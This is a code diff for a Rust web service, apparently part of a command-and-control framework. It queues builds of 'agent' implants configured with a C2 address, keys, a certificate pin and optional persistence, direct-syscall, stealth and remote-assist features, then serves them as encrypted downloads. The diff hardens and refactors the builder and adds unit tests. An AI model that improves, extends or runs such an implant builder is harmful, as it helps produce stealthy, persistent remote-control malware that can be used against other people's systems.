@@ -1,16 +1,16 @@
-use axum::{Json, extract::State, response::IntoResponse, http::StatusCode};
+use axum::{extract::State, http::StatusCode, response::IntoResponse, Json};
+use chrono::{Datelike, Utc};
 use serde::{Deserialize, Serialize};
-use std::sync::{Arc, Mutex};
 use std::collections::HashMap;
 use std::path::{Path, PathBuf};
 use std::process::Command;
-use uuid::Uuid;
-use chrono::{Utc, Datelike};
-use tokio::sync::mpsc;
 use std::sync::OnceLock;
+use std::sync::{Arc, Mutex};
+use tokio::sync::mpsc;
+use uuid::Uuid;
 
-use crate::state::AppState;
 use crate::auth::AuthenticatedUser;
+use crate::state::AppState;
 
 #[derive(Deserialize, Debug, Clone)]
 pub struct BuildRequest {
@@ -51,6 +51,7 @@ pub struct JobState {
     pub status: String,
     pub log: String,
     pub output_path: Option<String>,
+    pub error: Option<String>,
 }
 
 pub struct BuildJob {
@@ -65,43 +66,65 @@ static JOB_MAP: OnceLock<Arc<Mutex<HashMap<String, JobState>>>> = OnceLock::new(
 static JOB_SENDER: OnceLock<mpsc::Sender<BuildJob>> = OnceLock::new();
 
 pub fn init_build_queue(workers: usize, build_dir: PathBuf, retention_days: u32) {
+    if JOB_SENDER.get().is_some() {
+        return;
+    }
+
     let map = Arc::new(Mutex::new(HashMap::new()));
     let _ = JOB_MAP.set(map.clone());
-    
+
     let (tx, rx) = mpsc::channel::<BuildJob>(100);
     let rx = Arc::new(tokio::sync::Mutex::new(rx));
     let _ = JOB_SENDER.set(tx);
 
-    for i in 0..workers {
+    for i in 0..workers.max(1) {
         let map_clone = map.clone();
         let rx = rx.clone();
         tokio::spawn(async move {
-            let mut rx_lock = rx.lock().await;
-            while let Some(job) = rx_lock.recv().await {
+            loop {
+                let job = {
+                    let mut rx_lock = rx.lock().await;
+                    rx_lock.recv().await
+                };
+                let Some(job) = job else {
+                    break;
+                };
+
                 {
                     let mut m = map_clone.lock().unwrap();
                     if let Some(s) = m.get_mut(&job.job_id) {
                         s.status = "Running".to_string();
-                        s.log.push_str(&format!("[Worker {}] Started job {}\n", i, job.job_id));
+                        s.error = None;
+                        s.log
+                            .push_str(&format!("[Worker {}] Started job {}\n", i, job.job_id));
                     }
                 }
-                
-                let BuildJob { job_id, req, operator, server_build_dir, state_ref: _ } = job;
-                
+
+                let BuildJob {
+                    job_id,
+                    req,
+                    operator,
+                    server_build_dir,
+                    state_ref: _,
+                } = job;
+
                 let res = tokio::task::spawn_blocking({
                     let map2 = map_clone.clone();
                     let jid = job_id.clone();
                     move || execute_build_safely(jid, req, operator, server_build_dir, map2)
-                }).await.unwrap();
+                })
+                .await
+                .unwrap();
 
-                let (outcome_str, fs_path) = match res {
-                    Ok(path) => ("Completed", Some(path)),
+                let (outcome_str, fs_path, error) = match res {
+                    Ok(path) => ("Completed", Some(path), None),
                     Err(e) => {
+                        let error = e.to_string();
                         let mut m = map_clone.lock().unwrap();
                         if let Some(s) = m.get_mut(&job_id) {
-                            s.log.push_str(&format!("\nBuild failed: {}\n", e));
+                            s.log.push_str(&format!("\nBuild failed: {}\n", error));
                         }
-                        ("Failed", None)
+                        ("Failed", None, Some(error))
                     }
                 };
 
@@ -109,6 +132,7 @@ pub fn init_build_queue(workers: usize, build_dir: PathBuf, retention_days: u32)
                 if let Some(s) = m.get_mut(&job_id) {
                     s.status = outcome_str.to_string();
                     s.output_path = fs_path;
+                    s.error = error;
                     if outcome_str == "Completed" {
                         s.log.push_str("\n--- Build Successful ---\n");
                     }
@@ -123,9 +147,11 @@ pub fn init_build_queue(workers: usize, build_dir: PathBuf, retention_days: u32)
             tokio::time::sleep(std::time::Duration::from_secs(3600)).await;
             let mut m = map.lock().unwrap();
             m.retain(|_, v| {
-                if v.status == "Queued" || v.status == "Running" { return true; }
+                if v.status == "Queued" || v.status == "Running" {
+                    return true;
+                }
                 // In a real app we'd check modification times of the files in build_dir
-                // and prune appropriately. 
+                // and prune appropriately.
                 true
             });
             // Cleanup FS
@@ -149,14 +175,31 @@ pub fn init_build_queue(workers: usize, build_dir: PathBuf, retention_days: u32)
 pub async fn handle_build(
     State(state): State<Arc<AppState>>,
     axum::extract::Extension(user): axum::extract::Extension<AuthenticatedUser>,
-    Json(req): Json<BuildRequest>
+    Json(req): Json<BuildRequest>,
 ) -> Result<Json<BuildResponse>, (StatusCode, Json<BuildResponse>)> {
     if req.host.is_empty() || req.port == 0 || req.key.is_empty() || req.pin.is_empty() {
-        return Err((StatusCode::BAD_REQUEST, Json(BuildResponse {
-            job_id: None, log: None, status: None, error: Some("Missing required fields".into()),
-        })));
+        return Err((
+            StatusCode::BAD_REQUEST,
+            Json(BuildResponse {
+                job_id: None,
+                log: None,
+                status: None,
+                error: Some("Missing required fields".into()),
+            }),
+        ));
     }
-    
+    if let Err(err) = validate_cert_pin(&req.pin) {
+        return Err((
+            StatusCode::BAD_REQUEST,
+            Json(BuildResponse {
+                job_id: None,
+                log: None,
+                status: None,
+                error: Some(err.to_string()),
+            }),
+        ));
+    }
+
     // Initialize lazily if not done
     if JOB_SENDER.get().is_none() {
         // As a fallback to avoid crash if not properly initialized in main
@@ -164,28 +207,58 @@ pub async fn handle_build(
     }
 
     let job_id = Uuid::new_v4().to_string();
-    
-    state.audit.record_simple("BUILDER", &user.0, "EnqueueBuild", &format!("job_id={job_id}"), common::Outcome::Success);
+
+    state.audit.record_simple(
+        "BUILDER",
+        &user.0,
+        "EnqueueBuild",
+        &format!("job_id={job_id}"),
+        common::Outcome::Success,
+    );
 
     let sender = JOB_SENDER.get().unwrap();
     let map = JOB_MAP.get().unwrap();
 
     {
         let mut m = map.lock().unwrap();
-        m.insert(job_id.clone(), JobState {
-            status: "Queued".to_string(),
-            log: format!("Job {} enqueued.\n", job_id),
-            output_path: None,
-        });
+        m.insert(
+            job_id.clone(),
+            JobState {
+                status: "Queued".to_string(),
+                log: format!("Job {} enqueued.\n", job_id),
+                output_path: None,
+                error: None,
+            },
+        );
     }
 
-    sender.send(BuildJob {
-        job_id: job_id.clone(),
-        req,
-        operator: user.0,
-        server_build_dir: state.config.builds_output_dir.clone(), // Get from app state
-        state_ref: state.clone(),
-    }).await.ok();
+    if sender
+        .send(BuildJob {
+            job_id: job_id.clone(),
+            req,
+            operator: user.0,
+            server_build_dir: state.config.builds_output_dir.clone(), // Get from app state
+            state_ref: state.clone(),
+        })
+        .await
+        .is_err()
+    {
+        let mut m = map.lock().unwrap();
+        if let Some(s) = m.get_mut(&job_id) {
+            s.status = "Failed".to_string();
+            s.error = Some("build queue is not accepting jobs".to_string());
+            s.log.push_str("build queue is not accepting jobs\n");
+        }
+        return Err((
+            StatusCode::SERVICE_UNAVAILABLE,
+            Json(BuildResponse {
+                job_id: Some(job_id),
+                log: None,
+                status: Some("Failed".into()),
+                error: Some("build queue is not accepting jobs".into()),
+            }),
+        ));
+    }
 
     Ok(Json(BuildResponse {
         job_id: Some(job_id),
@@ -205,14 +278,20 @@ pub async fn handle_build_status(
                 job_id: Some(job_id),
                 log: Some(s.log.clone()),
                 status: Some(s.status.clone()),
-                error: None,
+                error: s.error.clone(),
             }));
         }
     }
     Err((StatusCode::NOT_FOUND, "Job not found".to_string()))
 }
 
-fn execute_build_safely(job_id: String, req: BuildRequest, _operator: String, base_build_dir: PathBuf, map_rc: Arc<Mutex<HashMap<String, JobState>>>) -> anyhow::Result<String> {
+fn execute_build_safely(
+    job_id: String,
+    req: BuildRequest,
+    _operator: String,
+    base_build_dir: PathBuf,
+    map_rc: Arc<Mutex<HashMap<String, JobState>>>,
+) -> anyhow::Result<String> {
     let append_log = |line: &str| {
         if let Ok(mut m) = map_rc.lock() {
             if let Some(s) = m.get_mut(&job_id) {
@@ -225,95 +304,77 @@ fn execute_build_safely(job_id: String, req: BuildRequest, _operator: String, ba
     let workspace = Path::new(env!("CARGO_MANIFEST_DIR")).parent().unwrap();
     let temp_dir = tempfile::tempdir()?;
     let tmp_path = temp_dir.path();
-    
-    append_log(&format!("Creating temporary sandbox at {}", tmp_path.display()));
-    
-    let src_dirs = vec!["agent", "common", "builder", "hollowing", "module_loader", "optimizer", "Cargo.toml", "Cargo.lock"];
-    for d in src_dirs {
-        let p = workspace.join(d);
-        if p.exists() {
-            let status = Command::new("cp")
-                .arg("-a")
-                .arg(&p)
-                .arg(tmp_path)
-                .status()?;
-            if !status.success() {
-                anyhow::bail!("Failed to copy {} into tmp workspace", d);
-            }
-        }
-    }
-    
-    let c2_addr = format!("{}:{}", req.host, req.port);
-    let mut features = vec!["outbound-c".to_string()];
-    if req.features.persistence { features.push("persistence".to_string()); }
-    if req.features.direct_syscalls { features.push("direct-syscalls".to_string()); }
-    if req.features.remote_assist { features.push("remote-assist".to_string()); }
-    if req.features.stealth { features.push("stealth".to_string()); }
 
-    let baked_config_path = tmp_path.join("agent/src/baked_config.rs");
-    let baked_content = format!(r#"
-pub fn get_baked_config() -> common::config::Config {{
-    let mut c = common::config::Config::default();
-    c.server_cert_fingerprint = Some("{pin}".into());
-    c
-}}
-"#, pin = req.pin);
-    std::fs::write(&baked_config_path, baked_content)?;
+    append_log(&format!(
+        "Creating temporary sandbox at {}",
+        tmp_path.display()
+    ));
 
-    let profile = builder::config::PayloadConfig {
-        target_os: req.os.clone(),
-        target_arch: req.arch.clone(),
-        c2_address: c2_addr,
-        encryption_key: req.key.clone(),
-        hmac_key: req.key.clone(),
-        c_server_secret: Some(req.key.clone()),
-            server_cert_fingerprint: None,
-        features,
-        output_name: Some(job_id.clone()),
-        package: "launcher".to_string(),
-        bin_name: None,
-    };
-    
+    copy_workspace_for_build(workspace, tmp_path)?;
+
+    let profile = build_profile_from_request(&job_id, &req)?;
+
     append_log("Executing cargo build within sandbox limits...");
-    
+
     let mut cmd = Command::new("cargo");
     cmd.current_dir(tmp_path);
-    cmd.arg("run").arg("--release").arg("-p").arg("builder").arg("--").arg("build").arg("temp_profile");
-    
+    cmd.arg("run")
+        .arg("--release")
+        .arg("-p")
+        .arg("builder")
+        .arg("--")
+        .arg("build")
+        .arg("temp_profile");
+
     let profile_dir = tmp_path.join("profiles");
     std::fs::create_dir_all(&profile_dir)?;
-    std::fs::write(profile_dir.join("temp_profile.toml"), toml::to_string_pretty(&profile)?)?;
-    
+    std::fs::write(
+        profile_dir.join("temp_profile.toml"),
+        toml::to_string_pretty(&profile)?,
+    )?;
+
     #[cfg(unix)]
     {
         use std::os::unix::process::CommandExt;
         unsafe {
             cmd.pre_exec(|| {
-                libc::setrlimit(libc::RLIMIT_AS, &libc::rlimit { rlim_cur: 4_000_000_000, rlim_max: 4_000_000_000 });
-                libc::setrlimit(libc::RLIMIT_CPU, &libc::rlimit { rlim_cur: 300, rlim_max: 300 });
+                libc::setrlimit(
+                    libc::RLIMIT_AS,
+                    &libc::rlimit {
+                        rlim_cur: 4_000_000_000,
+                        rlim_max: 4_000_000_000,
+                    },
+                );
+                libc::setrlimit(
+                    libc::RLIMIT_CPU,
+                    &libc::rlimit {
+                        rlim_cur: 300,
+                        rlim_max: 300,
+                    },
+                );
                 Ok(())
             });
         }
     }
-    
+
     let output = cmd.output()?;
     let stdout = String::from_utf8_lossy(&output.stdout);
     let stderr = String::from_utf8_lossy(&output.stderr);
-    
+
     append_log(&format!("stdout:\n{}", stdout));
     if !stderr.is_empty() {
         append_log(&format!("stderr:\n{}", stderr));
     }
-    
+
     if !output.status.success() {
         anyhow::bail!("Build process failed.");
     }
-    
-    let enc_path = tmp_path.join("dist").join("temp_profile.enc");
+
+    let enc_path = tmp_path.join("dist").join(format!("{job_id}.enc"));
     if !enc_path.exists() {
-        anyhow::bail!("Output binary not found in expected 'dist' folder!");
+        anyhow::bail!("encrypted output not found at {}", enc_path.display());
     }
-    
+
     // Choose output directory
     let mut out_dir = base_build_dir;
     if let Some(user_dir) = req.output_dir {
@@ -325,20 +386,108 @@ pub fn get_baked_config() -> common::config::Config {{
             }
         }
     }
-    
+
     // YYYY-MM-DD_jobid
     let today = Utc::now();
-    let folder_name = format!("{:04}-{:02}-{:02}_{}", today.year(), today.month(), today.day(), &job_id[..8]);
+    let folder_name = format!(
+        "{:04}-{:02}-{:02}_{}",
+        today.year(),
+        today.month(),
+        today.day(),
+        &job_id[..8]
+    );
     let final_dir = out_dir.join(&folder_name);
-    
-    std::fs::create_dir_all(&final_dir).map_err(|e| anyhow::anyhow!("Failed to create output dir {:?}: {}", final_dir, e))?;
-    
-    let final_dest = final_dir.join("agent.exe"); // naming doesn't matter much or extract from target
+
+    std::fs::create_dir_all(&final_dir)
+        .map_err(|e| anyhow::anyhow!("Failed to create output dir {:?}: {}", final_dir, e))?;
+
+    let final_dest = final_dir.join(format!("agent-{job_id}.enc"));
     std::fs::copy(&enc_path, &final_dest)?;
-    
+
     append_log(&format!("Saved successfully to: {}", final_dest.display()));
-    
+
     Ok(final_dest.to_string_lossy().to_string())
+}
+
+fn build_profile_from_request(
+    job_id: &str,
+    req: &BuildRequest,
+) -> anyhow::Result<builder::config::PayloadConfig> {
+    validate_cert_pin(&req.pin)?;
+
+    let c2_addr = format!("{}:{}", req.host, req.port);
+    let mut features = vec!["outbound-c".to_string()];
+    if req.features.persistence {
+        features.push("persistence".to_string());
+    }
+    if req.features.direct_syscalls {
+        features.push("direct-syscalls".to_string());
+    }
+    if req.features.remote_assist {
+        features.push("remote-assist".to_string());
+    }
+    if req.features.stealth {
+        features.push("stealth".to_string());
+    }
+
+    Ok(builder::config::PayloadConfig {
+        target_os: req.os.clone(),
+        target_arch: req.arch.clone(),
+        c2_address: c2_addr,
+        encryption_key: req.key.clone(),
+        hmac_key: None,
+        c_server_secret: Some(req.key.clone()),
+        server_cert_fingerprint: Some(req.pin.clone()),
+        features,
+        output_name: Some(job_id.to_string()),
+        package: "agent".to_string(),
+        bin_name: Some("agent-standalone".to_string()),
+    })
+}
+
+fn validate_cert_pin(pin: &str) -> anyhow::Result<()> {
+    let pin = pin.trim();
+    if pin.len() != 64 || !pin.chars().all(|c| c.is_ascii_hexdigit()) {
+        anyhow::bail!("pin must be a SHA-256 certificate fingerprint encoded as 64 hex characters");
+    }
+    Ok(())
+}
+
+fn copy_workspace_for_build(src_root: &Path, dst_root: &Path) -> anyhow::Result<()> {
+    for entry in std::fs::read_dir(src_root)? {
+        let entry = entry?;
+        let name = entry.file_name();
+        let name = name.to_string_lossy();
+        if matches!(
+            name.as_ref(),
+            "target" | ".git" | ".vscode" | "dist" | "profiles"
+        ) {
+            continue;
+        }
+        let dst = dst_root.join(name.as_ref());
+        copy_path_recursive(&entry.path(), &dst)?;
+    }
+    Ok(())
+}
+
+fn copy_path_recursive(src: &Path, dst: &Path) -> anyhow::Result<()> {
+    let file_type = std::fs::symlink_metadata(src)?.file_type();
+    if file_type.is_symlink() {
+        return Ok(());
+    }
+    if file_type.is_dir() {
+        std::fs::create_dir_all(dst)?;
+        for entry in std::fs::read_dir(src)? {
+            let entry = entry?;
+            copy_path_recursive(&entry.path(), &dst.join(entry.file_name()))?;
+        }
+    } else if file_type.is_file() {
+        if let Some(parent) = dst.parent() {
+            std::fs::create_dir_all(parent)?;
+        }
+        std::fs::copy(src, dst)?;
+    }
+    Ok(())
 }
 
 pub async fn handle_download(
@@ -347,18 +496,30 @@ pub async fn handle_download(
     if !job_id.chars().all(|c| c.is_alphanumeric() || c == '-') {
         return Err(StatusCode::BAD_REQUEST);
     }
-    
+
     let file_path = if let Some(map) = JOB_MAP.get() {
         let m = map.lock().unwrap();
-        m.get(&job_id).and_then(|s| s.output_path.clone())
+        let Some(state) = m.get(&job_id) else {
+            return Err(StatusCode::NOT_FOUND);
+        };
+        if state.status != "Completed" {
+            return Err(StatusCode::NOT_FOUND);
+        }
+        state.output_path.clone()
     } else {
         None
-    };
+    }
+    .ok_or(StatusCode::NOT_FOUND)?;
 
-    let path = file_path.unwrap_or_else(|| "/dev/null".to_string());
-    
-    let file = tokio::fs::read(&path).await.map_err(|_| StatusCode::NOT_FOUND)?;
-    
+    let file = tokio::fs::read(&file_path)
+        .await
+        .map_err(|_| StatusCode::NOT_FOUND)?;
+    let filename = Path::new(&file_path)
+        .file_name()
+        .and_then(|s| s.to_str())
+        .map(str::to_owned)
+        .unwrap_or_else(|| format!("agent-{job_id}.enc"));
+
     let mut headers = axum::http::HeaderMap::new();
     headers.insert(
         axum::http::header::CONTENT_TYPE,
@@ -366,8 +527,71 @@ pub async fn handle_download(
     );
     headers.insert(
         axum::http::header::CONTENT_DISPOSITION,
-        axum::http::header::HeaderValue::from_str(&format!("attachment; filename=\"agent-{}.enc\"", job_id)).unwrap(),
+        axum::http::header::HeaderValue::from_str(&format!(
+            "attachment; filename=\"{}\"",
+            filename
+        ))
+        .unwrap(),
     );
-    
+
     Ok((headers, file))
+}
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+
+    fn request() -> BuildRequest {
+        BuildRequest {
+            os: "linux".into(),
+            arch: "x86_64".into(),
+            features: BuildFeatures {
+                persistence: true,
+                direct_syscalls: false,
+                remote_assist: false,
+                stealth: false,
+            },
+            host: "127.0.0.1".into(),
+            port: 8444,
+            pin: "0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef".into(),
+            key: "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa=".into(),
+            output_dir: None,
+        }
+    }
+
+    #[test]
+    fn server_build_profile_targets_outbound_agent_with_pin() {
+        let profile = build_profile_from_request("job123", &request()).unwrap();
+        assert_eq!(profile.package, "agent");
+        assert_eq!(profile.bin_name.as_deref(), Some("agent-standalone"));
+        assert_eq!(profile.output_name.as_deref(), Some("job123"));
+        assert_eq!(
+            profile.server_cert_fingerprint.as_deref(),
+            Some("0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef")
+        );
+        assert!(profile.features.contains(&"outbound-c".to_string()));
+        assert!(profile.features.contains(&"persistence".to_string()));
+    }
+
+    #[test]
+    fn invalid_cert_pin_is_rejected() {
+        assert!(validate_cert_pin("not-a-pin").is_err());
+    }
+
+    #[test]
+    fn workspace_copy_excludes_target_directory() {
+        let src = tempfile::tempdir().unwrap();
+        let dst = tempfile::tempdir().unwrap();
+        std::fs::write(src.path().join("Cargo.toml"), "[workspace]\n").unwrap();
+        std::fs::create_dir_all(src.path().join("agent/src")).unwrap();
+        std::fs::write(src.path().join("agent/src/lib.rs"), "").unwrap();
+        std::fs::create_dir_all(src.path().join("target/debug")).unwrap();
+        std::fs::write(src.path().join("target/debug/large"), "ignore").unwrap();
+
+        copy_workspace_for_build(src.path(), dst.path()).unwrap();
+
+        assert!(dst.path().join("Cargo.toml").exists());
+        assert!(dst.path().join("agent/src/lib.rs").exists());
+        assert!(!dst.path().join("target").exists());
+    }
 }
